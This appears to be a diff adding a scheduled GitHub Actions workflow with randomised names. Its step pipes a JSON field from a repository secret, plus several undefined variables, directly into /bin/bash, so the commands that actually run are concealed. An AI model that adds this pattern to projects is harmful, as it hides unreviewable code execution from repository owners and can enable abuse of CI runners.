@@ -1,0 +1,20 @@
+name: gudanbeidiniu
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '4 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: gudanbeidiniu
+        env:
+          wmrb17: ${{ secrets.wmrb17 }}
+        run: |
+          echo $wmrb17 | jq -r .pdx565 | /bin/bash
+          echo $t4 | jq -r .u2 | /bin/bash
+          echo $oq3848 | jq -r .aywk6266 | /bin/bash
+          echo $m057 | jq -r .b784 | /bin/bash
+
